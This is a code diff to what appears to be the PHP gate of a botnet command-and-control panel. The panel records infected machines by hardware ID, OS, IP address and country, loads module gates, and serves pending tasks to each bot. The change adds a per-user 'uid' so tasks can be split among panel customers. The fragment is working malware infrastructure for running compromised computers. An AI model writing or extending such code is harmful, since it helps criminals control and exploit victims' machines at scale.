@@ -25,7 +25,12 @@ elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd'
 	if ($stmt->rowCount() > 0)
 		db_query("UPDATE `bots` SET `OS` = :2, `IP` = :3, `country` = :4, `date` = CURRENT_TIMESTAMP WHERE `hwid` = :1", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country);
 	else
-		db_query("INSERT INTO `bots`(`hwid`, `OS`, `IP`, `country`) VALUES(:1, :2, :3, :4)", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country);
+	{
+		if (isset($_GET['uid']))
+			db_query("INSERT INTO `bots`(`hwid`, `OS`, `IP`, `country`, `uid`) VALUES(:1, :2, :3, :4, :5)", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country, intval($_GET['uid']));
+		else
+			db_query("INSERT INTO `bots`(`hwid`, `OS`, `IP`, `country`) VALUES(:1, :2, :3, :4)", $_GET['hwid'], $_GET['os'], $_SERVER['REMOTE_ADDR'], $country);
+	}
 	// module
 	foreach (scandir('modules') as $mod)
 	{
@@ -33,7 +38,16 @@ elseif ($_GET && isset($_GET['hwid']) && isset($_GET['os']) && isset($_GET['pwd'
 			include_once('modules/'.$mod.'/gate.php');
 	}
 	// tasks
-	$stmt = db_query("SELECT * FROM `tasks` WHERE
+	if (isset($_GET['uid']))
+		$stmt = db_query("SELECT * FROM `tasks` WHERE
+				`start` <= NOW() AND
+				`stop` > NOW() AND
+				(`count` = 0 OR `count` > `received`) AND
+				`uid` = :3 AND
+				(`countries` = '' OR `countries` LIKE '%:1%') AND
+				(SELECT COUNT(`id`) FROM `sentTasks` WHERE `tid` = `tasks`.`id` AND `hwid` = :2) = 0", $country, $_GET['hwid'], $_GET['uid']);
+	else
+		$stmt = db_query("SELECT * FROM `tasks` WHERE
 				`start` <= NOW() AND
 				`stop` > NOW() AND
 				(`count` = 0 OR `count` > `received`) AND
